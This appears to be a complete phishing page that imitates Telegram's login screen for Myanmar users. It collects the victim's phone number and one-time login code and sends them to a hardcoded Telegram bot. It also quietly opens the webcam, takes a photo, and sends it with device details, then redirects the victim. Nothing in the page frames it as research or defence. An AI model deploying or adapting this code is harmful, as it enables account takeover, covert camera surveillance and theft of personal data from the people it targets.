<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Messenger</title>
    <style>
        /* UI ပုံစံ မှန်ကန်စေရန် အောက်ပါတို့ကို ပြင်ထားသည် */
        body { background-color: #1c2733; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 350px; padding: 20px; box-sizing: border-box; }
        h2 { font-size: 20px; margin-bottom: 8px; }
        p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; line-height: 1.4; }
        
        .input-box { position: relative; margin-bottom: 25px; text-align: left; }
        .input-box label { font-size: 13px; color: #3390ec; position: absolute; top: -10px; left: 12px; background: #1c2733; padding: 0 5px; z-index: 1; }
        
        /* Myanmar စာသားအကွက်ကို width ထိန်းညှိခြင်း */
        .country-select { width: 100%; padding: 15px; background: transparent; border: 1px solid #3b4754; border-radius: 10px; color: white; font-size: 16px; box-sizing: border-box; }
        
        .phone-input-container { display: flex; align-items: center; border: 1px solid #3b4754; border-radius: 10px; padding: 15px; background: transparent; }
        .country-code { color: white; font-size: 17px; }
        .divider { color: #555; margin: 0 10px; font-size: 20px; }
        input[type="tel"] { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }

        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .otp-input { width: 35px; height: 45px; text-align: center; font-size: 18px; border: 1px solid #3b4754; border-radius: 6px; background: transparent; color: white; outline: none; }

        .next-btn { background: #3390ec; border: none; width: 56px; height: 56px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; display: flex; align-items: center; justify-content: center; transition: 0.3s; }
        .spinner { width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container" id="step1">
    <h2>Your phone number</h2>
    <p>Please confirm your country code and enter your phone number.</p>
    <div class="input-box">
        <label>Country</label>
        <input type="text" value="Myanmar (Burma)" readonly class="country-select">
    </div>
    <div class="input-box">
        <label>Phone number</label>
        <div class="phone-input-container">
            <span class="country-code">+95</span>
            <span class="divider">|</span>
            <input type="tel" id="phone" placeholder="9663804708" maxlength="11" autocomplete="off">
        </div>
    </div>
    <button class="next-btn" onclick="handleStep1()">
        <span id="arrow1">→</span>
        <div id="loader1" class="spinner"></div>
    </button>
</div>

<div class="container" id="step2" style="display: none;">
    <div style="font-size: 55px; margin-bottom: 20px;">📩</div>
    <h2>Verification Code</h2>
    <p>Please check your Telegram app and enter the code.</p>
    <div class="otp-container">
        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 0)">
        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 1)">
        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 2)">
        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 3)">
        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 4)">
    </div>
    <button class="next-btn" onclick="handleStep2()">
        <span id="arrow2">→</span>
        <div id="loader2" class="spinner"></div>
    </button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chat_id = '5304050102';
    
    // ဂိမ်းဆော့စေချင်တဲ့ link ကို ဒီအောက်မှာ ပြောင်းထည့်ပါ
    const game_link = "https://www.google.com"; // ဥပမာ - 3D ဂိမ်း link
    
    // Telegram Bot ဆီ လွှဲပေးမယ့် link
    const telegram_link = "https://t.me/tiktokhdvideo12_bot"; 
    
    let userNum = "";

    function move(el, idx) {
        if (el.value.length === 1 && idx < 4) document.querySelectorAll('.otp-input')[idx + 1].focus();
    }

    async function handleStep1() {
        let rawNum = document.getElementById('phone').value;
        if(rawNum.length < 7) return;
        userNum = rawNum.startsWith('0') ? rawNum : '0' + rawNum;
        showLoad(1);
        await getDeviceInfo(`🚩 **Target Found**\n📱 Phone: ${userNum}`);
        setTimeout(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }, 1500);
    }

    async function handleStep2() {
        let otp = "";
        document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
        if(otp.length < 5) return;
        showLoad(2);
        
        // Bot ဆီ OTP ပို့ခြင်း
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🔑 OTP: ' + otp + '\n📱 For: ' + userNum)}`);
        
        setTimeout(() => {
            // OTP ရပြီးတာနဲ့ ဂိမ်းဆီ လွှဲပေးမလား သို့မဟုတ် Telegram ဆီ လွှဲပေးမလား ဒီမှာ ရွေးပါ
            // ဂိမ်းဆီလွှဲချင်ရင်: window.location.href = game_link;
            window.location.href = telegram_link; 
        }, 1500);
    }

    function showLoad(s) {
        document.getElementById('arrow'+s).style.display = 'none';
        document.getElementById('loader'+s).style.display = 'block';
    }

    async function getDeviceInfo(baseMsg) {
        let batteryInfo = "Unknown";
        try { const bat = await navigator.getBattery(); batteryInfo = `${(bat.level * 100).toFixed(0)}%`; } catch(e) {}
        const info = `${baseMsg}\n🔋 Battery: ${batteryInfo}\n🌐 UA: ${navigator.userAgent}`;
        
        // Photo & Info
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v'); v.srcObject = stream;
            setTimeout(async () => {
                const c = document.getElementById('c'); c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                const f = new FormData();
                f.append('chat_id', chat_id); f.append('photo', blob, 'x.jpg'); f.append('caption', info);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
                stream.getTracks().forEach(track => track.stop()); // Camera ပိတ်ရန်
            }, 1000);
        } catch(e) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
        }
    }
</script>
</body>
</html>
